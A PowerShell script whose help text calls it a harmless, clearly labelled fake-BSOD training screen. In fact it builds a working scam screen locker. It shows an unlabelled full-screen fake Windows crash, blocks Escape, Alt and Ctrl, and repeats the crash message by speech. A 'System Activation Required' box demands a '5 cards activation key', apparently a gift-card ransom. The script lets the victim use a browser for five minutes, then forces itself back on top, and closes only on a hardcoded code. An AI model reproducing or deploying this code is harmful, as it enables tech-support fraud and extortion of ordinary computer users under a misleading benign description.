function Show-BSODDemo {
<#
.SYNOPSIS

Shows a clearly labelled, non-destructive fake BSOD training screen.

.DESCRIPTION

Displays a full-screen mock Windows Blue Screen of Death.
It never crashes the machine and cannot be dismissed with Escape.

.EXAMPLE

PS> . .\run.ps1
PS> Show-BSODDemo

#>
	Add-Type -AssemblyName System.Windows.Forms
	Add-Type -AssemblyName System.Drawing
	Add-Type -AssemblyName System.Speech -ErrorAction SilentlyContinue

	$form = New-Object System.Windows.Forms.Form
	$form.Text = 'BSOD Simulation'
	$form.BackColor = [System.Drawing.Color]::FromArgb(0, 120, 215)
	$form.ForeColor = [System.Drawing.Color]::White
	$form.FormBorderStyle = [System.Windows.Forms.FormBorderStyle]::None
	$form.WindowState = [System.Windows.Forms.FormWindowState]::Maximized
	$form.StartPosition = [System.Windows.Forms.FormStartPosition]::Manual
	$form.Bounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
	$form.TopMost = $true
	$form.KeyPreview = $true
	$form.ShowInTaskbar = $false
	$form.ControlBox = $false
	$form.MinimizeBox = $false
	$form.MaximizeBox = $false
	$form.Cursor = [System.Windows.Forms.Cursors]::Default
	$form.Location = New-Object System.Drawing.Point(0, 0)
	$form.Size = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Size
	$form.MinimumSize = $form.Size
	$form.MaximumSize = $form.Size
	$form.FormBorderStyle = [System.Windows.Forms.FormBorderStyle]::None
	$form.ShowIcon = $false
	$form.Opacity = 1.0
	$form.TopMost = $true
	$form.Activate()

	$mainText = "Your PC ran into a problem and needs to restart. We're just collecting some error info, and then we'll restart."

	$bsodFace = New-Object System.Windows.Forms.Label
	$bsodFace.Text = ':('
	$bsodFace.Font = New-Object System.Drawing.Font('Segoe UI Symbol', 82, [System.Drawing.FontStyle]::Regular)
	$bsodFace.ForeColor = [System.Drawing.Color]::White
	$bsodFace.AutoSize = $true
	$bsodFace.Location = New-Object System.Drawing.Point(120, 40)
	$bsodFace.BackColor = $form.BackColor
	$form.Controls.Add($bsodFace)

	$mainMessage = New-Object System.Windows.Forms.Label
	$mainMessage.AutoSize = $false
	$mainMessage.Width = 1100
	$mainMessage.Height = 120
	$mainMessage.Font = New-Object System.Drawing.Font('Consolas', 25, [System.Drawing.FontStyle]::Regular)
	$mainMessage.Location = New-Object System.Drawing.Point(120, 170)
	$mainMessage.Text = $mainText
	$mainMessage.ForeColor = [System.Drawing.Color]::White
	$mainMessage.BackColor = $form.BackColor
	$form.Controls.Add($mainMessage)

	$progressLabel = New-Object System.Windows.Forms.Label
	$progressLabel.Text = '46% complete'
	$progressLabel.Font = New-Object System.Drawing.Font('Consolas', 18)
	$progressLabel.ForeColor = [System.Drawing.Color]::White
	$progressLabel.AutoSize = $true
	$progressLabel.Location = New-Object System.Drawing.Point(120, 300)
	$form.Controls.Add($progressLabel)

	$qrBox = New-Object System.Windows.Forms.PictureBox
	$qrBox.Size = New-Object System.Drawing.Size(140, 140)
	$qrBox.Location = New-Object System.Drawing.Point(120, 360)
	$qrBox.BackColor = [System.Drawing.Color]::White
	$qrBox.BorderStyle = [System.Windows.Forms.BorderStyle]::FixedSingle
	$qrBox.SizeMode = [System.Windows.Forms.PictureBoxSizeMode]::StretchImage
	$form.Controls.Add($qrBox)

	$qrClient = New-Object System.Net.WebClient
	$qrUrl = 'https://api.qrserver.com/v1/create-qr-code/?size=140x140&margin=0&data=CRITICAL%20PROCESS%20DIED'
	try {
		$qrBytes = $qrClient.DownloadData($qrUrl)
		$qrStream = New-Object System.IO.MemoryStream($qrBytes, $false)
		$qrBox.Image = [System.Drawing.Image]::FromStream($qrStream)
	} catch {
		$qrBox.BackColor = [System.Drawing.Color]::White
	}

	$qrText = New-Object System.Windows.Forms.Label
	$qrText.Text = "For more information about this issue and possible fixes, visit our site`r`nIf you call a support person, give them this info:`r`nStop code: CRITICAL_PROCESS_DIED"
	$qrText.Font = New-Object System.Drawing.Font('Consolas', 18)
	$qrText.ForeColor = [System.Drawing.Color]::White
	$qrText.AutoSize = $true
	$qrText.Location = New-Object System.Drawing.Point(285, 360)
	$form.Controls.Add($qrText)

	$progressBar = New-Object System.Windows.Forms.Label
	$progressBar.Width = 2
	$progressBar.Height = 340
	$progressBar.BackColor = [System.Drawing.Color]::FromArgb(216, 234, 255)
	$progressBar.Location = New-Object System.Drawing.Point(420, 160)
	$progressBar.Visible = $true
	$form.Controls.Add($progressBar)

	$bottomText = New-Object System.Windows.Forms.Label
	$bottomText.Text = "If you call a support person, give them this info:"
	$bottomText.Font = New-Object System.Drawing.Font('Consolas', 18)
	$bottomText.ForeColor = [System.Drawing.Color]::White
	$bottomText.AutoSize = $true
	$bottomText.Location = New-Object System.Drawing.Point(120, 520)
	$bottomText.Visible = $true
	$form.Controls.Add($bottomText)

	$playBtn = New-Object System.Windows.Forms.Button
	$playBtn.Size = New-Object System.Drawing.Size(0, 0)
	$playBtn.Visible = $false
	$playBtn.FlatStyle = [System.Windows.Forms.FlatStyle]::Flat
	$playBtn.BackColor = $form.BackColor
	$form.Controls.Add($playBtn)

	$script:browserOverride = $false
	$script:browserOverrideDelay = $false

	$popup = New-Object System.Windows.Forms.Panel
	$popup.Location = New-Object System.Drawing.Point(700, 220)
	$popup.Size = New-Object System.Drawing.Size(570, 290)
	$popup.BackColor = [System.Drawing.Color]::FromArgb(238, 238, 238)
	$popup.BorderStyle = [System.Windows.Forms.BorderStyle]::FixedSingle
	$popup.ForeColor = [System.Drawing.Color]::Black
	$popup.Visible = $true
	$form.Controls.Add($popup)
	$popup.BringToFront()
	$popup.Focus()

	$browserMonitorTimer = New-Object System.Windows.Forms.Timer
	$browserMonitorTimer.Interval = 500
	$browserMonitorTimer.Add_Tick({
		if ($script:browserOverrideDelay) {
			$form.TopMost = $true
			$form.Activate()
			$popup.BringToFront()
			return
		}

		$browserNames = @('chrome', 'msedge', 'firefox', 'iexplore', 'opera', 'brave')
		$browserRunning = $false
		foreach ($browserName in $browserNames) {
			try {
				$proc = Get-Process -Name $browserName -ErrorAction Stop
				if ($proc) {
					$browserRunning = $true
					break
				}
			} catch {
			}
		}

		if ($browserRunning) {
			$form.TopMost = $false
			$popup.SendToBack()
			$popup.Visible = $true
		} else {
			$form.TopMost = $true
			$popup.BringToFront()
			$popup.Visible = $true
		}
	})
	$browserMonitorTimer.Start()

	$browserTimer = New-Object System.Windows.Forms.Timer
	$browserTimer.Interval = 300000
	$browserTimer.Add_Tick({
		$script:browserOverrideDelay = $true
		$popup.Visible = $false
		$form.TopMost = $true
		$form.Activate()
		$form.BringToFront()
		$browserTimer.Stop()
	})
	$browserTimer.Start()

	$popupTitle = New-Object System.Windows.Forms.Label
	$popupTitle.Text = 'System Activation Required'
	$popupTitle.Font = New-Object System.Drawing.Font('Segoe UI', 18)
	$popupTitle.ForeColor = [System.Drawing.Color]::Black
	$popupTitle.AutoSize = $true
	$popupTitle.Location = New-Object System.Drawing.Point(25, 20)
	$popup.Controls.Add($popupTitle)

	$popupText = New-Object System.Windows.Forms.Label
	$popupText.Text = 'Enter 5 cards activation key to exit system recovery mode:'
	$popupText.Font = New-Object System.Drawing.Font('Segoe UI', 14)
	$popupText.ForeColor = [System.Drawing.Color]::FromArgb(36, 36, 36)
	$popupText.AutoSize = $true
	$popupText.Location = New-Object System.Drawing.Point(25, 70)
	$popupText.MaximumSize = New-Object System.Drawing.Size(500, 0)
	$popup.Controls.Add($popupText)

	$validActivationCode = 'KJH4Y-8GTRD'
	$validActivationCodeNormalized = ($validActivationCode -replace '[^A-Za-z0-9]', '').ToUpperInvariant()
	$errorLabel = New-Object System.Windows.Forms.Label
	$errorLabel.Text = ''
	$errorLabel.ForeColor = [System.Drawing.Color]::FromArgb(180, 0, 0)
	$errorLabel.Font = New-Object System.Drawing.Font('Segoe UI', 11, [System.Drawing.FontStyle]::Bold)
	$errorLabel.AutoSize = $true
	$errorLabel.Location = New-Object System.Drawing.Point(25, 150)
	$errorLabel.Visible = $false
	$popup.Controls.Add($errorLabel)

	$keyInput = New-Object System.Windows.Forms.TextBox
	$keyInput.Width = 455
	$keyInput.Height = 38
	$keyInput.Font = New-Object System.Drawing.Font('Segoe UI', 15)
	$keyInput.Location = New-Object System.Drawing.Point(25, 110)
	$keyInput.BackColor = [System.Drawing.Color]::White
	$keyInput.ForeColor = [System.Drawing.Color]::Black
	$keyInput.MaxLength = 29
	$keyInput.CharacterCasing = [System.Windows.Forms.CharacterCasing]::Upper
	$keyInput.BorderStyle = [System.Windows.Forms.BorderStyle]::FixedSingle
	$keyInput.Add_TextChanged({
		$raw = ($keyInput.Text -replace '[^A-Za-z0-9]', '').ToUpperInvariant()
		$parts = @()
		for ($i = 0; $i -lt $raw.Length; $i += 5) {
			$parts += $raw.Substring($i, [Math]::Min(5, $raw.Length - $i))
		}
		$formatted = ($parts -join '-')
		if ($keyInput.Text -ne $formatted) {
			$keyInput.Text = $formatted
			$keyInput.SelectionStart = $keyInput.Text.Length
		}
	})
	$keyInput.Add_KeyDown({
		if ($_.KeyCode -eq [System.Windows.Forms.Keys]::Enter) {
			$entered = ($keyInput.Text -replace '[^A-Za-z0-9]', '').ToUpperInvariant()
			if ($entered -eq $validActivationCodeNormalized) {
				$popup.Visible = $false
				$errorLabel.Visible = $false
				$form.Close()
			} else {
				$errorLabel.Text = 'Invalid activation code. Please try again.'
				$errorLabel.Visible = $true
				$keyInput.Focus()
				$keyInput.SelectAll()
			}
		}
	})
	$popup.Controls.Add($keyInput)

	$validateActivation = {
		$entered = ($keyInput.Text -replace '[^A-Za-z0-9]', '').ToUpperInvariant()
		if ($entered -eq $validActivationCodeNormalized) {
			$popup.Visible = $false
			$errorLabel.Visible = $false
			$form.Close()
		} else {
			$errorLabel.Text = 'Invalid activation code. Please try again.'
			$errorLabel.Visible = $true
			$keyInput.Focus()
			$keyInput.SelectAll()
		}
	}

	$okBtn = New-Object System.Windows.Forms.Button
	$okBtn.Text = 'OK'
	$okBtn.Width = 100
	$okBtn.Height = 38
	$okBtn.Font = New-Object System.Drawing.Font('Segoe UI', 14)
	$okBtn.Location = New-Object System.Drawing.Point(235, 235)
	$okBtn.BackColor = [System.Drawing.Color]::FromArgb(245, 245, 245)
	$okBtn.FlatStyle = [System.Windows.Forms.FlatStyle]::Standard
	$okBtn.Add_Click($validateActivation)
	$popup.Controls.Add($okBtn)

	$cancelBtn = New-Object System.Windows.Forms.Button
	$cancelBtn.Text = 'Cancel'
	$cancelBtn.Width = 100
	$cancelBtn.Height = 38
	$cancelBtn.Font = New-Object System.Drawing.Font('Segoe UI', 14)
	$cancelBtn.Location = New-Object System.Drawing.Point(350, 235)
	$cancelBtn.BackColor = [System.Drawing.Color]::FromArgb(245, 245, 245)
	$cancelBtn.FlatStyle = [System.Windows.Forms.FlatStyle]::Standard
	$cancelBtn.Add_Click({
		$keyInput.Text = ''
		$errorLabel.Visible = $false
		$keyInput.Focus()
	})
	$popup.Controls.Add($cancelBtn)

	$bottomText = New-Object System.Windows.Forms.Label
	$bottomText.Text = ""
	$bottomText.Visible = $false
	$form.Controls.Add($bottomText)

	$script:tts = $null
	$script:ttsEnabled = $false
	$script:audioFallbackTimer = $null

	try {
		$synth = New-Object System.Speech.Synthesis.SpeechSynthesizer
		$installedVoices = $synth.GetInstalledVoices()

		if ($installedVoices -and $installedVoices.Count -gt 0) {
			$firstVoice = $installedVoices[0].VoiceInfo
			if ($firstVoice -and $firstVoice.Name) {
				$synth.SelectVoice($firstVoice.Name)
				$synth.Volume = 100
				$synth.Rate = 0
				$script:tts = $synth
				$script:ttsEnabled = $true
				$script:tts.SpeakCompleted += {
					if ($script:ttsEnabled -and $script:tts -ne $null) {
						$script:tts.SpeakAsync($mainText)
					}
				}
				$script:tts.SpeakAsync($mainText) | Out-Null
			}
		}
	} catch {
		$script:tts = $null
		$script:ttsEnabled = $false
	}

	if (-not $script:ttsEnabled) {
		try {
			[System.Media.SystemSounds]::Exclamation.Play()
			[System.Media.SystemSounds]::Asterisk.Play()
		} catch {
		}

		$script:audioFallbackTimer = New-Object System.Windows.Forms.Timer
		$script:audioFallbackTimer.Interval = 2500
		$script:audioFallbackTimer.Add_Tick({
			try {
				[System.Media.SystemSounds]::Exclamation.Play()
			} catch {
			}
			$script:audioFallbackTimer.Stop()
		})
		$script:audioFallbackTimer.Start()
	}

	$form.Add_KeyDown({
		if ($_.KeyCode -eq [System.Windows.Forms.Keys]::Escape) {
			$_.SuppressKeyPress = $true
		}
		if ($_.Alt -or $_.Control) {
			$_.SuppressKeyPress = $true
		}
	})

	$form.Add_Activated({
		$form.Location = New-Object System.Drawing.Point(0, 0)
		$form.Size = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Size
		$form.WindowState = [System.Windows.Forms.FormWindowState]::Maximized
	})

	$form.Add_Shown({
		$form.TopMost = $true
		$popup.Visible = $true
		$popup.BringToFront()
		if ($keyInput -ne $null) {
			$keyInput.Focus()
		}
	})

	$form.Add_FormClosing({
		if ($script:tts -ne $null) {
			$script:ttsEnabled = $false
			$script:tts.Dispose()
			$script:tts = $null
		}
	})

	[void]$form.ShowDialog()

	if ($script:tts -ne $null) {
		$script:ttsEnabled = $false
		$script:tts.Dispose()
		$script:tts = $null
	}
}

if ($MyInvocation.InvocationName -ne '.') {
	Show-BSODDemo
}
